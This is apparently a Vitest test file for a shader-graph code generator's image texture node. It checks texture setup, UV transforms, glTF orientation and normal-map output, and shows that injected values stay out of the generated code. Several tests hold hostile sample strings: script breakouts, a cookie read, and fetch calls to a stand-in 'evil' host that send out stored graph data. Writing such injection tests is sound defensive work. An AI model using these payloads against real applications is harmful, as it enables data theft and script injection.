import { describe, it, expect } from 'vitest';
import { graphToCode } from './graphToCode';
import { codeToGraph } from './codeToGraph';
import { buildShaderModule } from './tslCodeProcessor';
import { inlineImageAssetsFromNodes } from './imageAssets';
import { makeNode, makeEdge } from '../test-utils';

const B64 = btoa('abc'); // "YWJj"
const URL_WEBP = `data:image/webp;base64,${B64}`;

function imageGraph(values: Record<string, string | number>) {
  const image = makeNode('img1', 'imageNode', values);
  const output = makeNode('out1', 'output');
  return {
    nodes: [image, output],
    edges: [makeEdge('img1', 'out', 'out1', 'color')],
  };
}

describe('graphToCode — imageNode emission', () => {
  const valid = { imageB64: URL_WEBP, width: 2, height: 2, fileName: 'x.webp', colorSpace: 'color' };

  it('emits module-scope setup + a .rgb texture sample', () => {
    const { nodes, edges } = imageGraph(valid);
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('const _image1_img = new Image();');
    // The payload rides as a short placeholder + descriptive comment; the real
    // `data:` URL appears only after inlineImageAssets (see imageAssets.test.ts).
    expect(code).toMatch(/_image1_img\.src = "fs-asset:img1-[0-9a-f]{8}"; \/\/ x\.webp, 2x2 webp, 3 B/);
    expect(code).not.toContain(B64);
    expect(inlineImageAssetsFromNodes(code, nodes)).toContain(
      `_image1_img.src = "data:image/webp;base64,${B64}";`,
    );
    expect(code).toContain('try { await _image1_img.decode(); } catch { _image1_ok = false; }');
    expect(code).toContain('new globalThis.THREE.Texture(_image1_img)');
    expect(code).toContain('new globalThis.THREE.DataTexture(new Uint8Array([0, 0, 0, 255])');
    expect(code).toContain('_image1_tex.colorSpace = globalThis.THREE.SRGBColorSpace;');
    expect(code).toContain('_image1_tex.wrapS = globalThis.THREE.RepeatWrapping;');
    expect(code).toContain('_image1_tex.flipY = true;');
    // The horizontal correction (u' = 1-u) is baked into the default; the
    // user-facing "Flip X" toggle (unchecked by default) cancels it.
    expect(code).toContain(
      'const image1 = texture(_image1_tex, uv().mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;',
    );
    expect(code).toContain('return image1;');
    // Setup precedes the Fn (module scope), sample lives inside it.
    expect(code.indexOf('new Image()')).toBeLessThan(code.indexOf('Fn(() => {'));
    // texture + uv are imported for the branch.
    expect(code).toMatch(/import \{[^}]*\btexture\b[^}]*\} from 'three\/tsl'/);
    expect(code).toMatch(/import \{[^}]*\buv\b[^}]*\} from 'three\/tsl'/);
  });

  it('data colorSpace → linear, no mipmaps, linear filters', () => {
    const { nodes, edges } = imageGraph({ ...valid, colorSpace: 'data' });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('_image1_tex.colorSpace = globalThis.THREE.NoColorSpace;');
    expect(code).toContain('_image1_tex.generateMipmaps = false;');
    expect(code).toContain('_image1_tex.minFilter = globalThis.THREE.LinearFilter;');
  });

  it('Nearest filtering → nearest magnification, mipmapped nearest minification', () => {
    const { nodes, edges } = imageGraph({ ...valid, filter: 'nearest' });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('_image1_tex.magFilter = globalThis.THREE.NearestFilter;');
    expect(code).toContain('_image1_tex.minFilter = globalThis.THREE.NearestMipmapNearestFilter;');
    // A colour image keeps its mipmaps — that is what the minFilter samples.
    expect(code).not.toContain('generateMipmaps');
  });

  it('Nearest on a data map → nearest both ways, still no mipmaps', () => {
    const { nodes, edges } = imageGraph({ ...valid, colorSpace: 'data', filter: 'nearest' });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('_image1_tex.generateMipmaps = false;');
    expect(code).toContain('_image1_tex.minFilter = globalThis.THREE.NearestFilter;');
    expect(code).toContain('_image1_tex.magFilter = globalThis.THREE.NearestFilter;');
  });

  it('linear — absent, explicit or junk — emits byte-identically to before the option', () => {
    const base = graphToCode(imageGraph(valid).nodes, imageGraph(valid).edges).code;
    expect(base).not.toMatch(/minFilter|magFilter/);
    const baseData = graphToCode(
      imageGraph({ ...valid, colorSpace: 'data' }).nodes,
      imageGraph({ ...valid, colorSpace: 'data' }).edges,
    ).code;
    for (const filter of ['linear', 'Nearest', 'nearest ', 'NearestFilter; alert(1)', '', 1, 0]) {
      const g = imageGraph({ ...valid, filter });
      expect(graphToCode(g.nodes, g.edges).code, String(filter)).toBe(base);
      const d = imageGraph({ ...valid, colorSpace: 'data', filter });
      expect(graphToCode(d.nodes, d.edges).code, `data ${String(filter)}`).toBe(baseData);
    }
  });

  it('connected uv input replaces the uv() fallback (flip still applies)', () => {
    const image = makeNode('img1', 'imageNode', valid);
    const v2 = makeNode('v1', 'vec2', { x: 0.5, y: 0.5 });
    const output = makeNode('out1', 'output');
    const edges = [
      makeEdge('v1', 'out', 'img1', 'uv'),
      makeEdge('img1', 'out', 'out1', 'color'),
    ];
    const { code } = graphToCode([image, v2, output], edges);
    expect(code).toContain(
      'const image1 = texture(_image1_tex, vec21.mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;',
    );
    expect(code).not.toContain('uv()');
  });

  it('UV settings: Flip X checked → raw uv(); tile/offset chain on; repeat off → clamp', () => {
    // Checking "Flip X" cancels the baked-in horizontal correction → bare uv().
    const neutral = imageGraph({ ...valid, flipX: 1 });
    const plain = graphToCode(neutral.nodes, neutral.edges);
    expect(plain.code).toContain('const image1 = texture(_image1_tex, uv()).rgb;');

    const { nodes, edges } = imageGraph({
      ...valid,
      flipX: 1,
      flipY: 1,
      tileX: 2,
      tileY: 3,
      offsetX: 0.25,
      offsetY: -0.5,
      repeat: 0,
    });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain(
      'const image1 = texture(_image1_tex, uv().mul(vec2(1, -1)).add(vec2(0, 1)).mul(vec2(2, 3)).add(vec2(0.25, -0.5))).rgb;',
    );
    expect(code).toContain('_image1_tex.wrapS = globalThis.THREE.ClampToEdgeWrapping;');
    expect(code).toContain('_image1_tex.wrapT = globalThis.THREE.ClampToEdgeWrapping;');
  });

  it('wired tile/offset sockets override the stored values', () => {
    const image = makeNode('img1', 'imageNode', { ...valid, tileX: 5, offsetY: 9 });
    const f = makeNode('f1', 'float', { value: 2 });
    const output = makeNode('out1', 'output');
    const edges = [
      makeEdge('f1', 'out', 'img1', 'tileX'),
      makeEdge('f1', 'out', 'img1', 'offsetY'),
      makeEdge('img1', 'out', 'out1', 'color'),
    ];
    const { code } = graphToCode([image, f, output], edges);
    // The edge ref replaces tileX (stored 5 is ignored) while tileY keeps its
    // default literal; same for offsetY vs offsetX.
    expect(code).toContain('.mul(vec2(float1, 1))');
    expect(code).toContain('.add(vec2(0, float1))');
    expect(code).not.toContain('vec2(5,');
  });

  it('UV settings are Number-coerced — hostile strings never reach the code', () => {
    const { nodes, edges } = imageGraph({
      ...valid,
      tileX: '2);fetch("https://evil")//' as unknown as number,
      offsetX: 'NaN' as unknown as number,
    });
    const { code } = graphToCode(nodes, edges);
    expect(code).not.toContain('fetch');
    // Unparseable numbers fall back to the defaults (tile 1, offset 0).
    expect(code).toContain(
      'const image1 = texture(_image1_tex, uv().mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;',
    );
  });

  it('malformed payload degrades to an inert vec3 declaration (no dangling var)', () => {
    for (const imageB64 of ['', 'https://evil.example/x.png', 'data:image/png;base64,A=A=']) {
      const { nodes, edges } = imageGraph({ ...valid, imageB64 });
      const { code } = graphToCode(nodes, edges);
      expect(code).toContain('const image1 = vec3(0, 0, 0);');
      expect(code).not.toContain('new Image()');
      expect(code).not.toContain('evil.example');
    }
  });

  it('injection payloads never reach the emitted source', () => {
    const attacks = [
      `data:image/png;base64,AA";await fetch('https://evil/'+localStorage.getItem('fs:graph'));//`,
      `data:image/png;base64,AA\`\${document.cookie}\``,
      `data:image/png;base64,AA</script><script>alert(1)</script>`,
    ];
    for (const imageB64 of attacks) {
      const { nodes, edges } = imageGraph({ ...valid, imageB64 });
      const { code } = graphToCode(nodes, edges);
      // Neither the editor text nor the expanded, executable form may carry it —
      // inlining is where the payload actually reaches a running module.
      for (const emitted of [code, inlineImageAssetsFromNodes(code, nodes)]) {
        expect(emitted).not.toContain('fetch');
        expect(emitted).not.toContain('document.cookie');
        expect(emitted).not.toContain('</script>');
        expect(emitted).toContain('const image1 = vec3(0, 0, 0);');
      }
    }
  });

  it('a hostile file name cannot break out of the placeholder comment', () => {
    const { nodes, edges } = imageGraph({
      ...valid,
      fileName: 'x.webp\nawait fetch("https://evil/");//',
    });
    const { code } = graphToCode(nodes, edges);
    // The comment is built from a character whitelist, so the injected newline
    // is destroyed and the payload stays inert text inside a one-line comment —
    // it can never become a statement of its own.
    const srcLine = code.split('\n').find((l) => l.includes('_image1_img.src')) ?? '';
    expect(srcLine).toMatch(/^_image1_img\.src = "fs-asset:img1-[0-9a-f]{8}"; \/\/ [A-Za-z0-9._, -]*$/);
    expect(code).not.toMatch(/^\s*await fetch/m);
  });

  it('re-derives the emitted literal from decoded bytes (canonical base64)', () => {
    // "AB==" is atob-valid but non-canonical (decodes to one byte 0x00, whose
    // canonical encoding is "AA=="): the emitted string must be the re-encoded
    // form, proving the stored string itself is never spliced into the code.
    const { nodes, edges } = imageGraph({ ...valid, imageB64: 'data:image/png;base64,AB==' });
    const { code } = graphToCode(nodes, edges);
    const inlined = inlineImageAssetsFromNodes(code, nodes);
    expect(inlined).toContain('_image1_img.src = "data:image/png;base64,AA==";');
    expect(inlined).not.toContain('AB==');
    expect(code).not.toContain('AB==');
  });

  it('malformed width blocks emission entirely', () => {
    const { nodes, edges } = imageGraph({ ...valid, width: 2.5 });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('const image1 = vec3(0, 0, 0);');
    expect(code).not.toContain(B64);
  });

  it('setup lines survive buildShaderModule at module scope (top-level await legal)', () => {
    const { nodes, edges } = imageGraph(valid);
    const { code } = graphToCode(nodes, edges);
    // Export inlines before building the module, so that's what's exercised here.
    const mod = buildShaderModule(inlineImageAssetsFromNodes(code, nodes), {});
    // Every setup statement must be re-emitted verbatim, before the exported
    // shader function (module scope — where top-level await is legal).
    for (const line of [
      'const _image1_img = new Image();',
      `_image1_img.src = "data:image/webp;base64,${B64}";`,
      'try { await _image1_img.decode(); } catch { _image1_ok = false; }',
      '_image1_tex.needsUpdate = true;',
    ]) {
      expect(mod).toContain(line);
      expect(mod.indexOf(line)).toBeLessThan(mod.indexOf('export default'));
    }
  });

  it('image → Normal is decoded as a normal map (normalMap wrap + import)', () => {
    const image = makeNode('img1', 'imageNode', valid);
    const output = makeNode('out1', 'output');
    const { code } = graphToCode(
      [image, output],
      [makeEdge('img1', 'out', 'out1', 'normal')],
    );
    // The raw [0,1] sample is wrapped so normalMap() applies the *2-1 decode +
    // TBN (tangent→view) transform, instead of shoving a raw vector into
    // normalNode (which would leave a flat, blue-biased surface).
    expect(code).toContain('return { normal: normalMap(image1) };');
    expect(code).toMatch(/import \{[^}]*\bnormalMap\b[^}]*\} from 'three\/tsl'/);
    // The sample itself is unchanged — only the Normal channel wraps it.
    expect(code).toContain('const image1 = texture(_image1_tex, uv().mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;');
  });

  it('image → Color is NOT wrapped (raw .rgb sample, no normalMap)', () => {
    const { nodes, edges } = imageGraph(valid); // imageGraph wires to 'color'
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('return image1;');
    expect(code).not.toContain('normalMap');
  });

  it('generated code is inert in codeToGraph (one-way by design, no output hijack)', () => {
    const { nodes, edges } = imageGraph(valid);
    const { code } = graphToCode(nodes, edges);
    const r = codeToGraph(code);
    // No error-severity ParseError (sync would be blocked), and the flat setup
    // statements must not fabricate nodes or steal the Output wiring — the
    // image node silently drops (its .rgb declarator is invisible to the
    // VariableDeclarator visitor), matching the Data node's degradation.
    expect(r.errors.filter((e) => e.severity !== 'warning')).toEqual([]);
    expect(r.nodes.filter((n) => n.data.registryType !== 'output')).toEqual([]);
    expect(r.edges).toEqual([]);
  });
});

describe('graphToCode — imageNode glTF mapping (orientation, UV set, green flip, texture transform)', () => {
  const valid = { imageB64: URL_WEBP, width: 2, height: 2, fileName: 'x.webp', colorSpace: 'color' };
  const sample = (code: string) => code.split('\n').find((l) => l.includes('const image1 = texture(')) ?? '';
  const importLine = (code: string) => code.split('\n').find((l) => l.includes("from 'three/tsl'")) ?? '';
  const normalGraph = (values: Record<string, string | number>) => ({
    nodes: [makeNode('img1', 'imageNode', { ...valid, colorSpace: 'data', ...values }), makeNode('out1', 'output')],
    edges: [makeEdge('img1', 'out', 'out1', 'normal')],
  });
  const code = (g: { nodes: ReturnType<typeof makeNode>[]; edges: ReturnType<typeof makeEdge>[] }) =>
    graphToCode(g.nodes, g.edges).code;

  const KEYS = ['orientation', 'normalGreen', 'uvSet', 'xfOffsetX', 'xfOffsetY', 'xfRotation', 'xfScaleX', 'xfScaleY'];
  const JUNK: unknown[] = [
    null, '', [], {}, true, false, NaN, Infinity, -Infinity, 1e7, '1', ' 2', 'GLTF', 'gltf ', 'flip ', '1); alert(1',
  ];
  /** Each key at its DEFAULT value: stored, and still meaning nothing. */
  const AT_DEFAULT: Record<string, unknown> = {
    orientation: 'app', normalGreen: '', uvSet: 0, xfOffsetX: 0, xfOffsetY: 0, xfRotation: 0, xfScaleX: 1, xfScaleY: 1,
  };

  it('(a) junk and default values under every key emit exactly the flagless code, wired to Color and to Normal', () => {
    const baseColor = code(imageGraph(valid));
    const baseNormal = code(normalGraph({}));
    const moved: string[] = [];
    for (const key of KEYS) {
      for (const v of [...JUNK, AT_DEFAULT[key]]) {
        const extra = { [key]: v } as Record<string, string | number>;
        if (code(imageGraph({ ...valid, ...extra })) !== baseColor) moved.push(`color ${key}=${String(v)}`);
        if (code(normalGraph(extra)) !== baseNormal) moved.push(`normal ${key}=${String(v)}`);
      }
    }
    expect(moved).toEqual([]);
  });

  it('(b) the glTF orientation uploads unflipped and drops the 1-u correction', () => {
    const c = code(imageGraph({ ...valid, orientation: 'gltf' }));
    expect(c).toContain('_image1_tex.flipY = false;');
    expect(c).not.toContain('_image1_tex.flipY = true;');
    expect(sample(c)).toBe('  const image1 = texture(_image1_tex, uv()).rgb;');
  });

  it('(c) under glTF each ticked Flip box mirrors; under the app orientation Flip X still cancels the correction', () => {
    expect(sample(code(imageGraph({ ...valid, orientation: 'gltf', flipX: 1 }))))
      .toBe('  const image1 = texture(_image1_tex, uv().mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;');
    expect(sample(code(imageGraph({ ...valid, orientation: 'gltf', flipY: 1 }))))
      .toBe('  const image1 = texture(_image1_tex, uv().mul(vec2(1, -1)).add(vec2(0, 1))).rgb;');
    const app = code(imageGraph({ ...valid, flipX: 1 }));
    expect(sample(app)).toBe('  const image1 = texture(_image1_tex, uv()).rgb;');
    expect(app).toContain('_image1_tex.flipY = true;');
  });

  it('(d) a UV set samples uv(n); a wired uv input beats it', () => {
    const c = code(imageGraph({ ...valid, uvSet: 2 }));
    expect(sample(c)).toBe('  const image1 = texture(_image1_tex, uv(2).mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;');
    expect(importLine(c)).toMatch(/\buv\b/);
    const wired = graphToCode(
      [makeNode('img1', 'imageNode', { ...valid, uvSet: 2 }), makeNode('v1', 'vec2', { x: 0.5, y: 0.5 }), makeNode('out1', 'output')],
      [makeEdge('v1', 'out', 'img1', 'uv'), makeEdge('img1', 'out', 'out1', 'color')],
    ).code;
    expect(sample(wired)).toBe('  const image1 = texture(_image1_tex, vec21.mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;');
    expect(wired).not.toContain('uv(2)');
  });

  it('(e) the transform comes BEFORE the mirror, tile and offset', () => {
    expect(sample(code(imageGraph({ ...valid, xfScaleX: 2, xfScaleY: 3 }))))
      .toBe('  const image1 = texture(_image1_tex, uv().mul(vec2(2, 3)).mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;');
    expect(sample(code(imageGraph({ ...valid, xfScaleX: 2, xfScaleY: 3, tileX: 4, tileY: 4, offsetX: 0.5 }))))
      .toBe('  const image1 = texture(_image1_tex, uv().mul(vec2(2, 3)).mul(vec2(-1, 1)).add(vec2(1, 0)).mul(vec2(4, 4)).add(vec2(0.5, 0))).rgb;');
  });

  it('(f) a rotation is ONE mat2 of clean constants, row-major, and imports mat2 (and no unused vec2)', () => {
    // All-number mat2 arguments build a THREE.Matrix2, which is ROW-major: a
    // quarter turn's rows (0, 1), (−1, 0) are written in reading order. The
    // string was `mat2(0, -1, 1, 0)` until the review caught that TSL read
    // it as the TRANSPOSE (the opposite turn); imageUvTransformTsl.test.ts
    // runs the emitted text through real three to pin the meaning.
    const c = code(imageGraph({ ...valid, orientation: 'gltf', xfRotation: Math.PI / 2 }));
    expect(sample(c)).toBe('  const image1 = texture(_image1_tex, mat2(0, 1, -1, 0).mul(uv())).rgb;');
    expect(importLine(c)).toMatch(/\bmat2\b/);
    expect(importLine(c)).not.toMatch(/\bvec2\b/);
    // Under the app orientation the mirror follows it.
    expect(code(imageGraph({ ...valid, xfRotation: Math.PI / 2 }))).toContain('mat2(0, 1, -1, 0).mul(uv()).mul(vec2(-1, 1))');
  });

  it('(g) an offset alone adds straight after the base', () => {
    expect(sample(code(imageGraph({ ...valid, orientation: 'gltf', xfOffsetX: 0.25, xfOffsetY: 0.5 }))))
      .toBe('  const image1 = texture(_image1_tex, uv().add(vec2(0.25, 0.5))).rgb;');
  });

  it('(h) the green flip scales the normal-map decode, and only there', () => {
    const c = code(normalGraph({ normalGreen: 'flip' }));
    expect(c).toContain('return { normal: normalMap(image1, vec2(1, -1)) };');
    expect(importLine(c)).toMatch(/\bvec2\b/);
    expect(code(imageGraph({ ...valid, normalGreen: 'flip' }))).toBe(code(imageGraph(valid)));
    // A channel socket is a scalar: never decoded, flipped or not.
    const alpha = graphToCode(
      [makeNode('img1', 'imageNode', { ...valid, normalGreen: 'flip' }), makeNode('out1', 'output')],
      [makeEdge('img1', 'alpha', 'out1', 'normal')],
    ).code;
    expect(alpha).not.toContain('normalMap(');
  });

  it('(i) a wired Direction replaces the UV set and the transform', () => {
    const c = graphToCode(
      [
        makeNode('img1', 'imageNode', { ...valid, uvSet: 2, xfScaleX: 2, xfOffsetX: 0.5 }),
        makeNode('d1', 'vec3', { x: 0, y: 1, z: 0 }),
        makeNode('out1', 'output'),
      ],
      [makeEdge('d1', 'out', 'img1', 'dir'), makeEdge('img1', 'out', 'out1', 'color')],
    ).code;
    expect(sample(c)).toMatch(/^ {2}const image1 = texture\(_image1_tex, equirectUV\(\w+\)\)\.rgb;$/);
  });

  it('(j) nothing stored reaches the code: string transform values are junk', () => {
    const base = code(imageGraph(valid));
    for (const key of ['xfOffsetX', 'xfOffsetY', 'xfRotation', 'xfScaleX', 'xfScaleY', 'uvSet', 'orientation', 'normalGreen']) {
      const c = code(imageGraph({ ...valid, [key]: '1); alert(1' }));
      expect(c, key).toBe(base);
      expect(c).not.toContain('alert');
    }
  });

  it('(k) buildShaderModule keeps the mat2 import at module scope', () => {
    const { nodes, edges } = imageGraph({ ...valid, orientation: 'gltf', xfRotation: Math.PI / 2 });
    const { code: c } = graphToCode(nodes, edges);
    const mod = buildShaderModule(inlineImageAssetsFromNodes(c, nodes), {});
    expect(mod).toMatch(/import \{[^}]*\bmat2\b[^}]*\} from 'three\/tsl'/);
    // Row-major literal arguments (see (f)): rows (0, 1), (−1, 0).
    expect(mod).toContain('mat2(0, 1, -1, 0).mul(uv())');
    expect(mod).toContain('_image1_tex.flipY = false;');
  });

  it('only the orientation splits a shared texture', () => {
    const two = (b: Record<string, string | number>) => graphToCode(
      [makeNode('img1', 'imageNode', valid), makeNode('img2', 'imageNode', { ...valid, ...b }), makeNode('m1', 'mul'), makeNode('out1', 'output')],
      [makeEdge('img1', 'out', 'm1', 'a'), makeEdge('img2', 'out', 'm1', 'b'), makeEdge('m1', 'out', 'out1', 'color')],
    ).code;
    const count = (s: string) => s.split('new globalThis.THREE.Texture(').length - 1;
    expect(count(two({}))).toBe(1);
    expect(count(two({ uvSet: 2, normalGreen: 'flip', xfScaleX: 2, xfRotation: 0.5 }))).toBe(1);
    const split = two({ orientation: 'gltf' });
    expect(count(split)).toBe(2);
    expect(split).toContain('_image1_tex.flipY = true;');
    expect(split).toContain('_image2_tex.flipY = false;');
    // …over ONE decoded element: one inlined payload.
    expect(split.split('new Image()').length - 1).toBe(1);
  });
});
